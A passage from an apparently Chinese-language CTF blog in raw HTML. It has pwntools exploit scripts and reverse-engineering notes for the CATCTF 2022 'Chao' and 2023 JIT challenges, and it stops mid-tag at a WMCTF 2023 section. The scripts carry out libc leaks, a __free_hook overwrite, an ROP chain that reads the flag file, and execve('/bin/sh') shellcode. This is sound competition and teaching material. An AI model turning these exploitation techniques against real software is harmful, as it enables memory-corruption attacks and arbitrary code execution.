class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">x</span>):<br>    sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>    cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;korey0sh1&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;l&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>decode()<br>cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CATCTF-2022-Chao🛏️💤"><a href="#CATCTF-2022-Chao🛏️💤" class="headerlink" title="CATCTF 2022 Chao🛏️💤"></a>CATCTF 2022 Chao🛏️💤</h2><p>winmt👴出的C++ Pwn</p><p>逆吐啦🤮🤮🤮🤮</p><p>Create里有0和1两种type，但观察update和show功能后，就能发现这两个功能只适配type0。然后看看两种type不同的虚表函数，就发现update type1能直接伪造size和show的基址，便可以任意地址读。</p><p>存在栈溢出漏洞，然后用0xfffffff7+0xa-1这种补码漏洞来触发C++异常处理绕过canary check</p><p><img src="/img/C++/13.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;chao&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0xdeadbeaf</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    edit(i+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0x11111</span>))<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>heap_base = u32(rc(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x5710</span><br><br>libc.address = u32(ru(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:]) - <span class="hljs-number">0x1e8780</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4ba9</span>))<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>elf_base = u32(rc(<span class="hljs-number">3</span>).rjust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x0c&#x27;</span>)) - <span class="hljs-number">0x4e0c</span><br>leak(<span class="hljs-string">&quot;elf&quot;</span>,elf_base)<br><br>lea_ret =  <span class="hljs-number">0x00110226</span>+libc.address<br>add_esp_1c = <span class="hljs-number">0x0001b034</span> + libc.address<br>ret = libc.address + <span class="hljs-number">0x0001922e</span><br>add_esp_4 = <span class="hljs-number">0x0002fe0e</span> + libc.address<br>add_esp_8 = <span class="hljs-number">0x0002fbe9</span> + libc.address<br>add_esp_c = <span class="hljs-number">0x0001b90a</span> + libc.address<br>int_0x80 = <span class="hljs-number">0x000312f5</span> + libc.address<br>pop_eax = <span class="hljs-number">0x000282eb</span> + libc.address<br>pop_ebx = <span class="hljs-number">0x0001de56</span> + libc.address<br>pop_ecx_edx = <span class="hljs-number">0x00030ea3</span> + libc.address<br>payload = flat([<br>    heap_base+<span class="hljs-number">0x54e8</span>,add_esp_1c,<br>    <span class="hljs-number">0x22222222</span>,<span class="hljs-number">0x33333333</span>,<span class="hljs-number">0x44444444</span>,<span class="hljs-number">0x55555555</span>,<span class="hljs-number">0x66666666</span>,<br>    lea_ret,<span class="hljs-number">0x88888888</span>,<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>],<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,heap_base+<span class="hljs-number">0x5524</span>,<br>])<br><br>orw = flat([<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],add_esp_8,heap_base+<span class="hljs-number">0x4c2f</span>,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],add_esp_1c,<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br>    ret,ret,ret,ret,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],add_esp_1c,<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br><br>])<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x11111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x1</span>))<br><br>edit(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0x4</span>) + p32(heap_base+<span class="hljs-number">0x54a8</span>)*<span class="hljs-number">3</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>)*<span class="hljs-number">4</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>) +p32(<span class="hljs-number">0x2044</span>+elf_base))<br><br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;......................................../flag&#x27;</span>)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x204c)\nc\n&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4bd9</span>))<br>show(<span class="hljs-number">0</span>)<br><br>sl(orw)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>额exp写的很乱，凑合着看吧</p><h2 id="西葫芦🗡-2023-JIT-😭"><a href="#西葫芦🗡-2023-JIT-😭" class="headerlink" title="西葫芦🗡 2023 JIT 😭"></a>西葫芦🗡 2023 JIT 😭</h2><p>今年年初的西葫芦🗡是👴第一次打大比赛，当初👴还不懂事，出了两道简单题后还不知好歹，看了一眼jit，当时就被吓得亚麻呆住了。</p><p>刨坟挖出来康康题，结果逆了一天逆了个大概，第二天一直在想怎么能把<code>shellcode</code>写到<code>exec_memory</code>里，最后还是看了rode👴的wp，用了<code>jmp short</code> 的短指令完成系统调用。</p><h3 id="逆亿下🤮🤮"><a href="#逆亿下🤮🤮" class="headerlink" title="逆亿下🤮🤮"></a>逆亿下🤮🤮</h3><p>整体逻辑还行</p><p>mmap了一个具有rwx权限的<code>memory</code>，经过<code>Compiler::handleFn</code>处理后，输入的内容会变成<code>memory</code>出的汇编，最后执行。</p><p>一个个来看</p><p>这个算是个对<code>exec_memory</code>的初始化</p><p><img src="/img/C++/14.png" alt="img"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">Compiler::</span>handleFn`函数里面，会读取输入的第一个字节，要求为\xff，并读取第<span class="hljs-number">1</span>、<span class="hljs-number">2</span>个字节为`args`和`locals<br></code></pre></td></tr></table></figure><p><img src="/img/C++/15.png" alt="img"></p><p>进入<code>Compiler::creatFunc</code>，<code>args</code> 要 小于8，<code>locals</code>要小于0x20，然后在<code>exec_memory</code>里用<code>sub rsp, 8*locals</code>开一个栈空间</p><p><img src="/img/C++/16.png" alt="img"></p><p>然后进入核心函数<code>Compiler::handleFnBody()</code></p><p>里面的<code>Compiler::var2idx</code>是将传入的参数进行处理，动调一下发现是[rbp - ret_value*8]</p><p>存在整数溢出漏洞，可以看到上层函数接受返回值的参数是单字节的，所以当varib为0xa0时可以使返回值为0，可以直接对rbp进行操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span> __cdecl <span class="hljs-title">Compiler::var2idx</span><span class="hljs-params">(u8 varib)</span></span><br><span class="hljs-function"></span>&#123;<br>  u8 variba; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x7F</span>) == <span class="hljs-number">0</span> )              <span class="hljs-comment">//varib!=0x7f </span><br>    <span class="hljs-built_in">fatal</span>();<br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x80</span>u) == <span class="hljs-number">0</span> )             <span class="hljs-comment">//varib &lt; 0x80</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( varib &gt; Compiler::ctx_args )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">8</span> * varib) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">8</span> * varib;<br>  &#125;<br>  <span class="hljs-keyword">else</span>                  <span class="hljs-number">1000</span>     <span class="hljs-number">1010</span>             <span class="hljs-comment">//varib &gt; 0x80</span><br>  &#123;<br>    variba = varib ^ <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(varib ^ <span class="hljs-number">0x80</span>) &gt; Compiler::ctx_locals )    <span class="hljs-comment">//当locals设置为max 0x20,varib max = 0xa0</span><br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">-8</span> * variba) &gt; <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-8</span> * variba;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/C++/17.png" alt="img"></p><p>后面就是0-5的<code>opcode</code>，6的利用条件太tm烦了👴就没看</p><p>基本上就是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        v0 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// 感觉是ret</span><br>        <span class="hljs-keyword">return</span> Compiler::<span class="hljs-built_in">var2idx</span>(v0);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        v2 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// mov [rbp - var],num</span><br>        var = Compiler::<span class="hljs-built_in">var2idx</span>(v2);<br>        imm = IRstream::<span class="hljs-built_in">getimm</span>();<br>        AsmHelper::<span class="hljs-built_in">imm2var</span>(var, imm);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1 = Compiler::<span class="hljs-built_in">var2idx</span>(v3);<br>        v4 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2 = Compiler::<span class="hljs-built_in">var2idx</span>(v4);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2);               <span class="hljs-comment">// mov [rbp-var2],[rbp-var1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1);<br>        AsmHelper::<span class="hljs-built_in">regassign</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        v5 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v5);<br>        v6 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v6);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_0);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_0);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x21</span>u);             <span class="hljs-comment">// and [rbp-var2_0],[rbp-var1_0]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        v7 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v7);<br>        v8 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v8);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_1);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_1);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">9u</span>);                <span class="hljs-comment">// or [rbp-var2-1],[rbp-var1_1]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        v9 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v9);<br>        v10 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v10);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_2);             <span class="hljs-comment">// xor [rbp-var2_2],[rbp-var2_1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_2);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x31</span>u);<br>        <span class="hljs-keyword">break</span>;<br>       <br></code></pre></td></tr></table></figure><p>最后<code>AsmHelper::func_ret</code>恢复栈帧，这样<code>just in time</code> 基本上就好了</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">JITHelper::</span>finailize()`将`exec_memory`的`rwx`权限改为`r_x<br></code></pre></td></tr></table></figure><p>后面的一连串check是使第一次转汇编的输入的<code>id</code>和<code>args</code>必须为0</p><p><img src="/img/C++/18.png" alt="img"></p><p>然后就是执行了<code>exec_memory</code>了</p><h3 id="利用🏳️🏳️"><a href="#利用🏳️🏳️" class="headerlink" title="利用🏳️🏳️"></a>利用🏳️🏳️</h3><p>那么问题来了，执行的时候没有<code>write</code>权限，👴该怎么往上写<code>shellcode</code>呢</p><p>👴一开始想的是在栈上布置<code>rop</code>链，但是要先泄露<code>libc</code>，也<code>pass</code>了</p><p>这是怎么绘事捏</p><p>后来看了rode👴的wp，又学到了新的东西</p><p>因为case 1中mov到栈上的是8字节，于是可以是<code>“xor rax, rax; jmp short&quot;</code>这种短跳转代码，那👴懂啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x1ddf)\nc\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\xff\x00\x00\x20&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8b&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>                            <span class="hljs-comment">#mov [rbp-0xb*8], /bin/sh</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8a&#x27;</span> + p64(<span class="hljs-number">0xffffffffff00</span>)                       <span class="hljs-comment">#mov [rbp-0xa*8], 0xffffffffff00</span><br>payload += <span class="hljs-string">b&#x27;\x01\x89&#x27;</span> + p64(<span class="hljs-number">0x47</span>)                                 <span class="hljs-comment">#mov [rbp-9*8], 0x47</span><br>payload += <span class="hljs-string">b&#x27;\x01\x88&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xf6\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rsi, rsi; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x87&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xd2\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rdx, rdx; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x86&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xc0\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rax, rax; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x85&#x27;</span> + <span class="hljs-string">b&quot;\x04\x3b\xeb\x0d\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#add al, 0x3b; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x84&#x27;</span> + <span class="hljs-string">b&quot;\x0f\x05\x00\x00\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#syscall</span><br>payload += <span class="hljs-string">b&#x27;\x03\xa0\x8a&#x27;</span>                                         <span class="hljs-comment">#and [rbp], [rbp-0xa*8]</span><br>payload += <span class="hljs-string">b&#x27;\x04\xa0\x89&#x27;</span>                                         <span class="hljs-comment">#or [rbp], [rbp-9*8]</span><br>payload += <span class="hljs-string">b&#x27;\x00\x8b&#x27;</span>                                             <span class="hljs-comment">#mov rdi,[rbp-b*8];ret</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="WMCTF-2023-JIT🥵"><a href="#WMCTF-2023-JIT🥵" class="headerlink" title="WMCTF 2023 JIT🥵"></a>WMCTF 2023 JIT🥵</h2><p>just in time ，又是你！！</p><p>👴只是想把C++pwn题学明白，👴有什么错，要拿2000行的屎山代码来恶心👴</p><h3 id="再逆亿下"><a href="#再逆亿下" class="headerlink" title="再逆亿下"></a>再逆亿下</h3><p>先输入<code>program</code>和<code>memory</code>，<code>program</code>要是16进制字符串，<code>memory</code>要是<code>len(program) //2</code></p><p><img 